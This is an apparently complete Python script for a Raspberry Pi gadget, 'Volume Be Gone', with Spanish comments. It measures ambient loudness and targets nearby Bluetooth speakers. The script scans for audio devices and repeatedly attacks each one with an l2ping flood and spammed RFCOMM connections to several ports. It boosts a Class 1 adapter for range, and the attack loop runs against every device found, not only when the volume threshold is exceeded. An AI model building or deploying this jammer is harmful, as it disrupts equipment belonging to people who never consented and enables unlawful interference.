#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Volume Be Gone - Bluetooth Speaker Control by Volume Level
Control automatico de parlantes Bluetooth basado en nivel de volumen ambiental.
Utiliza un encoder rotativo para configurar el umbral de activacion.

Author: Francisco Ortiz Rojas
        Ingeniero Electronico
        francisco.ortiz@marfinex.com

License: MIT
Version: 2.1
Date: Diciembre 2025

Basado en Reggaeton Be Gone de Roni Bandini
"""

import os
import subprocess
import sys

# Forzar UTF-8 en stdout/stderr para caracteres especiales
if sys.stdout.encoding != 'utf-8':
    import io
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace')
import signal
import time
import datetime
import numpy as np
import sounddevice as sd
from RPi import GPIO
from luma.core.interface.serial import i2c
from luma.oled.device import ssd1306
from PIL import Image
from PIL import ImageDraw
from PIL import ImageFont
import threading
import bluetooth
import math
import json
from pathlib import Path

# Configuración
# Detectar ruta del script automáticamente
script_dir = Path(__file__).parent.parent.resolve()
myPath = str(script_dir) + "/"
config_path = myPath + "config.json"
log_path = myPath + "log.txt"

threshold_db = 70  # Umbral inicial en decibeles
min_threshold_db = 70  # Umbral mínimo
max_threshold_db = 120  # Umbral máximo
packagesSize = 800
threadsCount = 1000
myDelay = 0.1
sample_rate = 44100
chunk_size = 4096
calibration_offset = 94  # Offset de calibración del micrófono

# Configuración de adaptador Bluetooth
# hci0 = Bluetooth interno de RPi
# hci1 = Adaptador USB externo (Clase 1)
bt_interface = "hci1"  # Cambiar a "hci0" para usar el interno
use_external_adapter = True  # True para usar adaptador USB

# Lista de dispositivos BT encontrados
bt_devices = []
attack_threads = []
scanning = False
monitoring = False
config_mode = True  # Modo configuración al inicio

# Encoder rotativo KY-040
GPIO.setwarnings(False)
GPIO.setmode(GPIO.BCM)
encoder_clk = 19  # CLK del encoder (Pin 35)
encoder_dt = 13   # DT del encoder (Pin 33)
encoder_sw = 26   # Switch/botón del encoder (Pin 37)

# Variables del encoder
encoder_last_clk = GPIO.HIGH
encoder_counter = 0
last_encoder_time = 0
fast_rotation_threshold = 0.05  # 50ms para detectar giro rápido

# Oled screen (luma.oled - compatible con Debian Trixie)
# Configuracion I2C para SSD1306 128x64
I2C_PORT = 1        # Bus I2C (1 para RPi 2/3/4)
I2C_ADDRESS = 0x3C  # Direccion I2C del display (puede ser 0x3D en algunos)

# Inicializar pantalla con luma.oled
try:
    serial = i2c(port=I2C_PORT, address=I2C_ADDRESS)
    disp = ssd1306(serial, width=128, height=64)
except Exception as e:
    print(f"[!] Error inicializando display: {e}")
    print("[!] Verifica que I2C este habilitado y el display conectado")
    sys.exit(1)

# Cargar fuente con fallback
font_path = myPath + 'whitrabt.ttf'
try:
    if os.path.exists(font_path):
        font = ImageFont.truetype(font_path, 12)
        font_small = ImageFont.truetype(font_path, 10)
    else:
        print(f"[!] Advertencia: Fuente {font_path} no encontrada, usando default")
        font = ImageFont.load_default()
        font_small = ImageFont.load_default()
except Exception as e:
    print(f"[!] Error cargando fuente: {e}, usando default")
    font = ImageFont.load_default()
    font_small = ImageFont.load_default()

# Dimensiones del display (luma.oled usa .size)
width = disp.width
height = disp.height
padding = -2
top = padding
bottom = height-padding
x = 0

# Variable global para controlar el thread del encoder
encoder_running = False

def setup_encoder():
    """Configura el encoder rotativo usando polling (más confiable que interrupciones)"""
    global encoder_running

    # Configurar GPIO
    GPIO.setwarnings(False)
    GPIO.setmode(GPIO.BCM)

    GPIO.setup(encoder_clk, GPIO.IN, pull_up_down=GPIO.PUD_UP)
    GPIO.setup(encoder_dt, GPIO.IN, pull_up_down=GPIO.PUD_UP)
    GPIO.setup(encoder_sw, GPIO.IN, pull_up_down=GPIO.PUD_UP)

    # Iniciar thread de polling para el encoder
    encoder_running = True
    encoder_thread = threading.Thread(target=encoder_polling_thread, daemon=True)
    encoder_thread.start()
    print("[*] Encoder configurado (modo polling)")

def encoder_polling_thread():
    """Thread que lee el encoder por polling (evita problemas con add_event_detect)"""
    global threshold_db, encoder_last_clk, last_encoder_time, config_mode, monitoring, encoder_running

    last_clk = GPIO.input(encoder_clk)
    last_sw = GPIO.HIGH
    button_press_time = 0

    while encoder_running:
        try:
            # Leer estado actual
            clk_state = GPIO.input(encoder_clk)
            dt_state = GPIO.input(encoder_dt)
            sw_state = GPIO.input(encoder_sw)

            # Detectar rotación del encoder
            if clk_state != last_clk:
                if clk_state == GPIO.LOW:
                    current_time = time.time()
                    time_diff = current_time - last_encoder_time

                    if config_mode:
                        # Determinar velocidad de rotación
                        if time_diff < fast_rotation_threshold:
                            step = 5  # Giro rápido
                        else:
                            step = 1  # Giro lento

                        if dt_state != clk_state:
                            # Giro horario - aumentar
                            if threshold_db < max_threshold_db:
                                threshold_db = min(threshold_db + step, max_threshold_db)
                                update_config_screen()
                        else:
                            # Giro antihorario - disminuir
                            if threshold_db > min_threshold_db:
                                threshold_db = max(threshold_db - step, min_threshold_db)
                                update_config_screen()

                        last_encoder_time = current_time

                last_clk = clk_state

            # Detectar botón del encoder
            if sw_state != last_sw:
                if sw_state == GPIO.LOW:
                    # Botón presionado
                    button_press_time = time.time()
                else:
                    # Botón liberado
                    if button_press_time > 0:
                        press_duration = time.time() - button_press_time
                        if press_duration < 2:
                            # Presión corta
                            if config_mode:
                                # En config: confirmar y comenzar monitoreo
                                config_mode = False
                                save_config()
                                print(f"[*] Configuracion confirmada: {threshold_db} dB")
                            elif monitoring:
                                # En monitoreo: volver a modo configuracion
                                config_mode = True
                                print(f"[*] Volviendo a modo configuracion")
                                update_config_screen()
                        # Presión larga se maneja abajo
                        button_press_time = 0

                last_sw = sw_state

            # Verificar presión larga del botón (reset)
            if sw_state == GPIO.LOW and button_press_time > 0:
                if time.time() - button_press_time > 2:
                    # Reset disponible en cualquier momento (monitoreo o config)
                    print("[*] Reiniciando sistema...")
                    monitoring = False
                    encoder_running = False
                    os.system("pkill -f l2ping")
                    os.system("pkill -f rfcomm")
                    GPIO.cleanup()
                    time.sleep(0.3)

                    # Detectar si corremos como servicio systemd
                    is_systemd_service = os.environ.get('INVOCATION_ID') is not None

                    if is_systemd_service:
                        # Reiniciar via systemctl
                        print("[*] Reiniciando servicio systemd...")
                        os.system("sudo systemctl restart volumebegone &")
                    else:
                        # Reiniciar manualmente
                        script_path = os.path.abspath(sys.argv[0])
                        subprocess.Popen(
                            ["sudo", sys.executable, script_path],
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL,
                            stdin=subprocess.DEVNULL,
                            start_new_session=True,
                            close_fds=True
                        )

                    time.sleep(0.3)
                    os._exit(0)

            # Pequeña pausa para no saturar CPU (2ms = respuesta rápida)
            time.sleep(0.002)

        except Exception as e:
            print(f"[!] Error en encoder polling: {e}")
            time.sleep(0.1)

def update_config_screen():
    """Actualiza la pantalla en modo configuracion con barra visual"""
    image = Image.new('1', (width, height))
    draw = ImageDraw.Draw(image)
    draw.rectangle((0,0,width,height), outline=0, fill=0)

    # Titulo
    draw.text((x, top+2), "Volume BeGone", font=font, fill=255)
    draw.text((x, top+14), "Config. Umbral:", font=font, fill=255)

    # Valor actual grande
    draw.text((x+30, top+28), f"{threshold_db} dB", font=font, fill=255)

    # Barra de progreso
    bar_y = top + 45
    bar_height = 8
    bar_width = 120
    bar_x = 4

    # Marco de la barra
    draw.rectangle((bar_x, bar_y, bar_x + bar_width, bar_y + bar_height), outline=255, fill=0)

    # Relleno de la barra (solo si hay progreso)
    fill_width = int((threshold_db - min_threshold_db) * bar_width / (max_threshold_db - min_threshold_db))
    if fill_width > 2:
        draw.rectangle((bar_x + 2, bar_y + 2, bar_x + fill_width, bar_y + bar_height - 2), outline=255, fill=255)

    # Instrucciones
    draw.text((x, top+56), "Gira:Ajustar OK:Iniciar", font=font_small, fill=255)

    disp.display(image)

def show_boot_screen(step, total_steps, message):
    """Muestra pantalla de carga con barra de progreso"""
    image = Image.new('1', (width, height))
    draw = ImageDraw.Draw(image)
    draw.rectangle((0,0,width,height), outline=0, fill=0)

    # Logo/Titulo
    draw.text((x, top+2), "Volume BeGone", font=font, fill=255)
    draw.text((x+90, top+2), "v2.1", font=font_small, fill=255)

    # Mensaje de estado con porcentaje
    percent = int((step / total_steps) * 100)
    draw.text((x, top+18), f"Cargando... {percent}%", font=font, fill=255)
    draw.text((x, top+32), message[:21], font=font_small, fill=255)

    # Barra de progreso
    bar_y = top + 46
    bar_height = 10
    bar_width = 120
    bar_x = 4

    # Marco
    draw.rectangle((bar_x, bar_y, bar_x + bar_width, bar_y + bar_height), outline=255, fill=0)

    # Progreso
    progress = int((step / total_steps) * bar_width)
    if progress > 2:
        draw.rectangle((bar_x + 1, bar_y + 1, bar_x + progress - 1, bar_y + bar_height - 1), outline=255, fill=255)

    disp.display(image)

def show_status_screen(status, details="", icon=""):
    """Muestra pantalla de estado simple"""
    image = Image.new('1', (width, height))
    draw = ImageDraw.Draw(image)
    draw.rectangle((0,0,width,height), outline=0, fill=0)

    # Título
    draw.text((x, top+2), "Volume BeGone", font=font, fill=255)

    # Icono (simple)
    if icon == "ok":
        # Checkmark simple
        draw.text((x+50, top+16), "[OK]", font=font, fill=255)
    elif icon == "error":
        draw.text((x+50, top+16), "[X]", font=font, fill=255)
    elif icon == "warning":
        draw.text((x+50, top+16), "[!]", font=font, fill=255)

    # Estado
    draw.text((x, top+28), status[:20], font=font, fill=255)
    if details:
        draw.text((x, top+40), details[:20], font=font_small, fill=255)

    disp.display(image)

def writeLog(myLine):
    """Escribe en el archivo de log"""
    try:
        now = datetime.datetime.now()
        dtFormatted = now.strftime("%Y-%m-%d %H:%M:%S")
        with open(log_path, 'a') as f:
            myLine = str(dtFormatted) + "," + myLine
            f.write(myLine + "\n")
    except Exception as e:
        print(f"[!] Error escribiendo log: {e}")

def updateScreen(message1, message2, message3="", message4=""):
    """Actualiza la pantalla OLED 128x64"""
    image = Image.new('1', (width, height))
    draw = ImageDraw.Draw(image)
    draw.rectangle((0,0,width,height), outline=0, fill=0)
    padding = -2
    x = 0
    top = padding
    
    # Con 64 píxeles tienes más espacio
    draw.text((x, top+2), "Volume BeGone", font=font, fill=255)
    draw.text((x, top+16), message1, font=font, fill=255)
    draw.text((x, top+28), message2, font=font, fill=255)
    if message3:
        draw.text((x, top+40), message3, font=font, fill=255)
    if message4:
        draw.text((x, top+52), message4, font=font_small, fill=255)
    
    disp.display(image)

def draw_volume_meter(db_level):
    """Dibuja un medidor visual del nivel de volumen"""
    image = Image.new('1', (width, height))
    draw = ImageDraw.Draw(image)
    draw.rectangle((0,0,width,height), outline=0, fill=0)

    # Titulo con estado
    status = "ACTIVO!" if db_level > threshold_db else ""
    draw.text((x, top+2), f"VBG {status}", font=font, fill=255)

    # Nivel actual y umbral
    draw.text((x, top+14), f"Nivel: {db_level:.1f} dB", font=font, fill=255)
    draw.text((x, top+26), f"Umbral: {threshold_db} dB", font=font, fill=255)

    # Medidor visual
    meter_y = top + 40
    meter_height = 10
    meter_width = 120
    meter_x = 4

    # Marco del medidor
    draw.rectangle((meter_x, meter_y, meter_x + meter_width, meter_y + meter_height), outline=255, fill=0)

    # Nivel actual (proteger contra valores negativos)
    if db_level > 0:
        level_width = int(min(db_level, 120) * meter_width / 120)
        if level_width > 2:
            draw.rectangle((meter_x + 2, meter_y + 2, meter_x + level_width, meter_y + meter_height - 2),
                          outline=255, fill=255)

    # Linea del umbral
    threshold_x = meter_x + int(threshold_db * meter_width / 120)
    draw.line((threshold_x, meter_y - 2, threshold_x, meter_y + meter_height + 2), fill=255, width=2)

    # Instrucciones: OK=Config, Hold=Reset
    draw.text((x, top+54), f"D:{len(bt_devices)} OK:Config 2s:Reset", font=font_small, fill=255)
    
    disp.display(image)

def check_bluetooth_adapters():
    """Verifica adaptadores Bluetooth disponibles"""
    global bt_interface, use_external_adapter
    
    try:
        # Verificar qué adaptadores están disponibles
        result = subprocess.run(['hciconfig'], capture_output=True, text=True)
        adapters = []
        
        for line in result.stdout.split('\n'):
            if line.startswith('hci'):
                adapter = line.split(':')[0]
                adapters.append(adapter)
        
        print(f"[*] Adaptadores encontrados: {adapters}")
        writeLog(f"Adaptadores BT: {adapters}")
        
        # Si hay adaptador externo (hci1) y está configurado para usarlo
        if use_external_adapter and 'hci1' in adapters:
            bt_interface = "hci1"
            print("[*] Usando adaptador externo (hci1) - Clase 1")
            
            # Configurar adaptador externo para máxima potencia
            os.system(f"sudo hciconfig {bt_interface} up")
            os.system(f"sudo hciconfig {bt_interface} class 0x000100")
            os.system(f"sudo hciconfig {bt_interface} lm master")
            os.system(f"sudo hciconfig {bt_interface} lp active,master")
            
        else:
            bt_interface = "hci0"
            print("[*] Usando adaptador interno (hci0)")
            os.system(f"sudo hciconfig {bt_interface} up")
            
        return True
        
    except Exception as e:
        print(f"[!] Error verificando adaptadores: {e}")
        return False

def save_config():
    """Guarda la configuración actual"""
    config = {
        'threshold_db': threshold_db,
        'calibration_offset': calibration_offset,
        'use_external_adapter': use_external_adapter
    }
    try:
        # Crear directorio si no existe (solo si hay directorio padre)
        config_dir = os.path.dirname(config_path)
        if config_dir:
            os.makedirs(config_dir, exist_ok=True)
        with open(config_path, 'w') as f:
            json.dump(config, f, indent=2)
        writeLog(f"Configuración guardada: Umbral={threshold_db}dB, Adaptador={'Externo' if use_external_adapter else 'Interno'}")
    except Exception as e:
        print(f"[!] Error guardando configuración: {e}")

def load_config():
    """Carga la configuración guardada"""
    global threshold_db, calibration_offset, use_external_adapter
    try:
        if os.path.exists(config_path):
            with open(config_path, 'r') as f:
                config = json.load(f)
                threshold_db = config.get('threshold_db', 70)
                calibration_offset = config.get('calibration_offset', 94)
                use_external_adapter = config.get('use_external_adapter', True)
                print(f"[*] Configuración cargada: Umbral={threshold_db}dB, Adaptador={'Externo' if use_external_adapter else 'Interno'}")
        else:
            print("[*] Config.json no encontrado, usando configuración por defecto")
    except Exception as e:
        print(f"[!] Error cargando configuración: {e}, usando valores por defecto")

def calculate_db(audio_data):
    """Calcula el nivel de dB del audio"""
    # Eliminar valores cero para evitar log(0)
    audio_data = audio_data[audio_data != 0]
    if len(audio_data) == 0:
        return -np.inf
    
    # Calcular RMS (Root Mean Square)
    rms = np.sqrt(np.mean(audio_data**2))
    
    # Convertir a dB (20 * log10(rms))
    if rms > 0:
        db = 20 * np.log10(rms) + calibration_offset
    else:
        db = -np.inf
    
    return db

def scan_bluetooth_devices():
    """Escanea dispositivos Bluetooth cercanos"""
    global bt_devices, scanning, bt_interface
    scanning = True
    
    print(f"[*] Escaneando dispositivos Bluetooth usando {bt_interface}...")
    updateScreen("Escaneando BT...", f"Adaptador: {bt_interface}", "Buscando parlantes...")
    
    try:
        # Hacer el adaptador BT descubrible
        os.system(f"hciconfig {bt_interface} piscan")
        
        # Escaneo más agresivo para adaptador externo
        if use_external_adapter and bt_interface == "hci1":
            # Aumentar ventana de escaneo para Clase 1
            os.system(f"hcitool -i {bt_interface} cmd 0x03 0x001A 0x00 0x10 0x00 0x10")
        
        # Descubrir dispositivos
        # Determinar device_id basado en el adaptador disponible
        device_id = -1  # -1 = usar default
        if bt_interface == "hci1":
            # Verificar si hci1 existe antes de usarlo
            result = subprocess.run(['hciconfig'], capture_output=True, text=True)
            if 'hci1' in result.stdout:
                device_id = 1
        else:
            device_id = 0

        nearby_devices = bluetooth.discover_devices(duration=10, lookup_names=True,
                                                   flush_cache=True, lookup_class=True,
                                                   device_id=device_id if device_id >= 0 else None)
        
        bt_devices = []
        for addr, name, device_class in nearby_devices:
            # Filtrar por clase de dispositivo de audio (0x240000)
            if device_class & 0x240000 == 0x240000:  # Audio/Video devices
                bt_devices.append({
                    'addr': addr,
                    'name': name if name else "Unknown",
                    'class': device_class
                })
                print(f"[+] Encontrado: {addr} - {name}")
        
        print(f"[*] Total dispositivos de audio encontrados: {len(bt_devices)}")
        writeLog(f"Dispositivos BT encontrados: {len(bt_devices)} usando {bt_interface}")
        
    except Exception as e:
        print(f"[!] Error escaneando: {e}")
        writeLog(f"Error en escaneo BT: {str(e)}")
    
    scanning = False
    return bt_devices

def attack_device(device_addr, device_name, method=2):
    """Ataca un dispositivo específico"""
    global bt_interface

    print(f"[*] Atacando {device_addr} ({device_name}) via {bt_interface}")
    writeLog(f"Atacando dispositivo: {device_addr} - {device_name} usando {bt_interface}")

    if method == 1:
        # Método 1: Conexión RFCOMM
        for i in range(10):  # Intentos limitados
            try:
                subprocess.call(['rfcomm', '-i', bt_interface, 'connect', device_addr, '1'], timeout=5)
            except subprocess.TimeoutExpired:
                pass
            except FileNotFoundError:
                print("[!] Comando rfcomm no encontrado")
                break
            except Exception as e:
                print(f"[!] Error en RFCOMM: {e}")
                pass
            time.sleep(0.1)

    elif method == 2:
        # Método 2: L2CAP ping flood
        for i in range(10):
            try:
                # Verificar que l2ping existe
                if os.system('which l2ping > /dev/null 2>&1') == 0:
                    os.system(f'l2ping -i {bt_interface} -s {packagesSize} -f {device_addr} &')
                else:
                    print("[!] Comando l2ping no encontrado")
                    break
            except Exception as e:
                print(f"[!] Error en L2CAP ping: {e}")
                pass
            time.sleep(0.1)

    elif method == 3:
        # Método 3: Conexión múltiple a servicios
        for i in range(10):
            try:
                # Intentar conectar a diferentes puertos/servicios
                for port in [1, 3, 5, 17, 19]:  # Puertos comunes de audio BT
                    subprocess.Popen(['rfcomm', '-i', bt_interface, 'connect', device_addr, str(port)],
                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    time.sleep(0.05)
            except FileNotFoundError:
                print("[!] Comando rfcomm no encontrado")
                break
            except Exception as e:
                print(f"[!] Error en multi-service: {e}")
                pass

def continuous_attack():
    """Ataque continuo a todos los dispositivos encontrados"""
    global bt_devices
    
    while monitoring:
        if bt_devices:
            for device in bt_devices:
                if not monitoring:
                    break
                    
                # Rotar entre métodos de ataque
                for method in [2, 1, 3]:
                    attack_device(device['addr'], device['name'], method)
                    
                    if not monitoring:
                        break
                    time.sleep(0.5)
        else:
            time.sleep(1)

def monitor_volume():
    """Monitorea el nivel de volumen continuamente"""
    global monitoring, bt_devices, config_mode

    # Variables para el cálculo de dB promedio
    db_history = []
    history_size = 10

    # Verificar que hay dispositivos de audio disponibles
    try:
        devices = sd.query_devices()
        input_device = sd.query_devices(kind='input')
        print(f"[*] Dispositivo de entrada detectado: {input_device['name']}")
    except Exception as e:
        print(f"[!] Error: No se detectó micrófono USB: {e}")
        updateScreen("ERROR", "Micrófono USB", "no detectado")
        return

    def audio_callback(indata, frames, time, status):
        if status:
            print(f"[!] Audio callback status: {status}")
        if config_mode:
            return

        # Calcular nivel de dB
        db_level = calculate_db(indata.flatten())

        # Mantener historial para promedio
        if db_level > -np.inf:
            db_history.append(db_level)
            if len(db_history) > history_size:
                db_history.pop(0)

            # Calcular promedio
            avg_db = np.mean(db_history)

            # Mostrar medidor visual
            draw_volume_meter(avg_db)

            # Si supera el umbral, activar ataque
            if avg_db > threshold_db and not scanning:
                print(f"[!] Umbral superado: {avg_db:.1f} dB")
                writeLog(f"Umbral superado: {avg_db:.1f} dB")

                # Escanear si no hay dispositivos
                if not bt_devices:
                    scan_thread = threading.Thread(target=scan_bluetooth_devices)
                    scan_thread.start()

    # Iniciar stream de audio
    try:
        with sd.InputStream(callback=audio_callback,
                           channels=1,
                           samplerate=sample_rate,
                           blocksize=chunk_size):
            print("[*] Monitoreando nivel de audio...")
            writeLog(f"Iniciado monitoreo de volumen - Umbral: {threshold_db} dB")

            while monitoring:
                time.sleep(0.1)
    except Exception as e:
        print(f"[!] Error en stream de audio: {e}")
        writeLog(f"Error en audio stream: {str(e)}")

def signal_handler(sig, frame):
    """Maneja la interrupción del programa"""
    global monitoring, encoder_running
    print('\n[*] Interrumpido')
    writeLog("Interrumpido")
    monitoring = False
    encoder_running = False

    # Detener todos los procesos de ataque
    os.system("pkill -f l2ping")
    os.system("pkill -f rfcomm")

    GPIO.cleanup()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def main():
    global monitoring, bt_devices, config_mode, threshold_db, bt_interface, encoder_running

    print("")
    print("Volume Be Gone 2.1 - Auto-Start Edition")
    print("Control de parlantes BT por nivel de volumen")
    print("Gira el encoder para ajustar, presiona OK para iniciar")
    print("")

    # Total de pasos de inicialización
    total_steps = 7
    current_step = 0

    # Paso 1: Inicializar pantalla
    current_step += 1
    show_boot_screen(current_step, total_steps, "Init Display...")
    print(f"[{current_step}/{total_steps}] Pantalla OLED inicializada")
    time.sleep(0.5)

    # Paso 2: Configurar GPIO/Encoder
    current_step += 1
    show_boot_screen(current_step, total_steps, "Setup GPIO...")
    print(f"[{current_step}/{total_steps}] Configurando encoder")
    setup_encoder()
    time.sleep(0.5)

    # Paso 3: Cargar configuración
    current_step += 1
    show_boot_screen(current_step, total_steps, "Load Config...")
    print(f"[{current_step}/{total_steps}] Cargando configuración")
    load_config()
    time.sleep(0.5)

    # Paso 4: Verificar Bluetooth
    current_step += 1
    show_boot_screen(current_step, total_steps, "Check Bluetooth...")
    print(f"[{current_step}/{total_steps}] Verificando adaptadores Bluetooth")
    if not check_bluetooth_adapters():
        print("[!] Error: No se detectaron adaptadores Bluetooth")
        show_status_screen("ERROR", "No Bluetooth", "error")
        time.sleep(5)
        return
    time.sleep(0.5)

    # Paso 5: Verificar Micrófono
    current_step += 1
    show_boot_screen(current_step, total_steps, "Check Mic...")
    print(f"[{current_step}/{total_steps}] Verificando micrófono USB")
    try:
        devices = sd.query_devices()
        input_device = sd.query_devices(kind='input')
        print(f"[*] Dispositivo de entrada: {input_device['name']}")
    except Exception as e:
        print(f"[!] Error: No se detectó micrófono USB: {e}")
        show_status_screen("ERROR", "No Microfono", "error")
        time.sleep(5)
        return
    time.sleep(0.5)

    # Paso 6: Cargar recursos
    current_step += 1
    show_boot_screen(current_step, total_steps, "Load Resources...")
    print(f"[{current_step}/{total_steps}] Cargando recursos")
    logo_path = myPath + 'images/logo.png'
    time.sleep(0.3)

    # Paso 7: Sistema listo
    current_step += 1
    show_boot_screen(current_step, total_steps, "System Ready!")
    print(f"[{current_step}/{total_steps}] Sistema listo")
    time.sleep(1)

    writeLog(f"Iniciado - Volume Be Gone 2.1 - Adaptador: {bt_interface}")

    # Mostrar logo si existe
    try:
        if os.path.exists(logo_path):
            image = Image.open(logo_path).convert('1')
            disp.display(image)
            time.sleep(1.5)
        else:
            print(f"[*] Logo no encontrado, omitiendo...")
    except Exception as e:
        print(f"[!] Error cargando logo: {e}")
    
    # Modo configuración
    update_config_screen()
    print(f"[*] Modo configuración - Umbral actual: {threshold_db} dB")
    print(f"[*] Usando adaptador: {bt_interface} ({'Externo Clase 1' if bt_interface == 'hci1' else 'Interno'})")
    print("[*] Gira para ajustar, presiona para continuar")
    
    # Esperar configuración
    while config_mode:
        time.sleep(0.1)
    
    print(f"[*] Iniciando sistema con umbral: {threshold_db} dB")
    writeLog(f"Sistema activado - Umbral: {threshold_db} dB - Adaptador: {bt_interface}")
    
    # Escaneo inicial
    updateScreen("Escaneando BT...", f"Adaptador: {bt_interface}", "Alcance extendido" if bt_interface == "hci1" else "")
    bt_devices = scan_bluetooth_devices()
    
    if bt_devices:
        updateScreen(f"Encontrados:", f"{len(bt_devices)} dispositivos", f"Umbral: {threshold_db}dB", "Hold 2s: Reset")
    else:
        updateScreen("Sin dispositivos", "Monitoreando...", f"Umbral: {threshold_db}dB", "Hold 2s: Reset")
    
    time.sleep(2)
    
    # Iniciar monitoreo
    monitoring = True
    
    # Thread para ataque continuo
    attack_thread = threading.Thread(target=continuous_attack)
    attack_thread.daemon = True
    attack_thread.start()
    
    # Thread para re-escaneo periódico
    def periodic_scan():
        while monitoring:
            time.sleep(30)  # Re-escanear cada 30 segundos
            if monitoring and not scanning and not config_mode:
                scan_bluetooth_devices()
    
    scan_thread = threading.Thread(target=periodic_scan)
    scan_thread.daemon = True
    scan_thread.start()
    
    # Monitorear volumen
    try:
        monitor_volume()
    except Exception as e:
        print(f"[!] Error: {e}")
        writeLog(f"Error en monitoreo: {str(e)}")
    finally:
        monitoring = False
        encoder_running = False
        os.system("pkill -f l2ping")
        os.system("pkill -f rfcomm")
        GPIO.cleanup()

if __name__ == '__main__':
    main()